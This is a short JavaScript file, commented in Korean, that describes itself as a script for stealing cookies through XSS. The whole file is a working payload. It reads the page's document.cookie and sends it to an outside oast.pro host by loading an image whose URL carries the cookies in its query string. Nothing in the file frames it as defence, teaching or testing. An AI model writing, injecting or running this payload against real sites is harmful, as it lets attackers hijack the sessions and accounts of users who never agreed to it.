// XSS를 통해 쿠키를 탈취하는 스크립트
(function() {
    // 서버로 쿠키를 전송할 URL을 설정
    const targetUrl = "https://d0ngpqjz1wg0000afe4ggokammhyyyyyb.oast.pro";

    // 현재 문서의 쿠키를 가져옴
    const cookies = document.cookie;

    // 쿠키를 포함하여 서버로 GET 요청을 보냄
    const img = new Image();
    img.src = `${targetUrl}?cookie=${encodeURIComponent(cookies)}`;
})();
